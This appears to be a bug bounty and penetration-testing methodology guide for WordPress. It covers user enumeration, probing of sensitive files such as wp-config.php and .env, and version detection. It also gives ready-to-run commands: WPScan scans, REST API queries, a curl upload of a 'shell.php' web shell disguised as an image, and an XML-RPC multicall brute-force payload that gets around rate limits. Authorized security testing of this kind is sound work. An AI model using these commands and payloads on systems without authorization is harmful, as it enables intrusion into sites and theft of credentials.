# WordPress Hacking Methodology

## Overview
WordPress powers a massive percentage of the web, making it a prime target for bug bounty and penetration testing. This document covers WordPress-specific attack vectors: user enumeration, plugin/theme exploitation, API abuse, and sensitive file discovery.

## Recon Endpoints

### User enumeration paths
These endpoints can reveal usernames, user IDs, and roles:

| Endpoint | Description |
|----------|-------------|
| `/wp-json/wp/v2/users` | REST API user listing (default) |
| `/?rest_route=/wp/v2/users/` | Alternative REST route |
| `/index.php?rest_route=/wp/v2/users` | Fallback REST route |
| `/author-sitemap.xml` | Yoast SEO author sitemap |
| `/?author=1` | Author archive (iterate IDs) |
| `/wp-login.php` | Login error messages reveal valid usernames |

### Sensitive files
| File | Risk |
|------|------|
| `/wp-content/debug.log` | PHP errors, stack traces, potential credentials |
| `/wp-config.php` | Database credentials, auth keys (should return 403/blank) |
| `/wp-admin/install.php` | If accessible, WP may not be fully installed |
| `/.env` | Environment variables (often misconfigured) |
| `/readme.html` | WordPress version disclosure |
| `/license.txt` | WordPress version disclosure |

### Login and registration
| Endpoint | Notes |
|----------|-------|
| `/wp-login.php` | Standard login page |
| `/wp-admin/login.php` | Alternative login path |
| `/login.php` | Custom login page |
| `/wp-login.php?action=register` | Registration page (check if open) |

## Version Detection

### Methods to determine WordPress version

1. **Meta generator tag** — View page source and search for:
   ```html
   <meta name="generator" content="WordPress 6.x" />
   ```

2. **readme.html** — Access `/readme.html` which often displays the version.

3. **CSS/JS version params** — WordPress appends `?ver=X.X.X` to enqueued scripts:
   ```
   /wp-includes/css/dist/block-library/style.min.css?ver=6.5.2
   ```

4. **RSS feed** — The RSS feed (`/feed/`) often includes the generator version.

5. **WPScan** — Automated detection:
   ```bash
   wpscan --url https://target.com --enumerate vp,vt,u
   ```

6. **Wappalyzer** — Browser extension that identifies CMS and version (may not always detect the exact core version).

## WordPress-Specific Attacks

### XML-RPC abuse
If `/xmlrpc.php` is accessible:

```bash
# Check if XML-RPC is enabled
curl -s -X POST https://target.com/xmlrpc.php \
  -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
```

**Attack vectors:**
- `pingback.ping` → SSRF (see `scenarios/ssrf-via-xmlrpc-pingback-workflow.md`)
- `wp.getUsersBlogs` → Brute force credentials
- `system.multicall` → Amplified brute force (many password attempts per request)

### REST API exploitation
```bash
# List all users
curl https://target.com/wp-json/wp/v2/users

# Get specific user
curl https://target.com/wp-json/wp/v2/users/1

# List posts (including drafts if authenticated)
curl https://target.com/wp-json/wp/v2/posts?status=draft

# List pages
curl https://target.com/wp-json/wp/v2/pages

# List plugins (requires auth)
curl https://target.com/wp-json/wp/v2/plugins
```

### Plugin and theme vulnerability scanning
```bash
# WPScan with plugin, theme, and user enumeration
wpscan --url https://target.com --enumerate p,t,tt,u

# Aggressive plugin detection
wpscan --url https://target.com --enumerate ap --plugins-detection aggressive

# Search for specific CVEs
wpscan --url https://target.com --enumerate vp  # vulnerable plugins
wpscan --url https://target.com --enumerate vt  # vulnerable themes
```

### File upload via media REST API
If you have contributor-level credentials:
```bash
curl -X POST https://target.com/wp-json/wp/v2/media \
  -H "Authorization: Basic BASE64_CREDS" \
  -F "file=@shell.php" \
  -F "title=innocent-image"
```

### Password brute force via XML-RPC multicall
```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
      <member><name>params</name><value><array><data>
        <value>admin</value><value>password1</value>
      </data></array></value></member>
    </struct></value>
    <value><struct>
      <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
      <member><name>params</name><value><array><data>
        <value>admin</value><value>password2</value>
      </data></array></value></member>
    </struct></value>
  </data></array></value></param></params>
</methodCall>
```

This sends multiple login attempts in a single request, bypassing per-request rate limiting.

## Checklist

| Priority | Test | Done |
|----------|------|------|
| **Critical** | XML-RPC enabled? Test SSRF and brute force | |
| **Critical** | `/wp-content/debug.log` accessible? | |
| **High** | REST API user enumeration | |
| **High** | Plugin/theme version → known CVEs | |
| **High** | Registration open? | |
| **Medium** | Author archive enumeration | |
| **Medium** | File upload via REST API | |
| **Low** | Version disclosure | |

## References

- `scenarios/ssrf-via-xmlrpc-pingback-workflow.md`
- `case-studies/case-study-ssrf-xmlrpc-wordpress.md`
- `case-studies/case-study-recon-wordpress-api-enumeration.md`
- `methodology/web-recon-methodology.md`
- `tools/recon-tools.md`
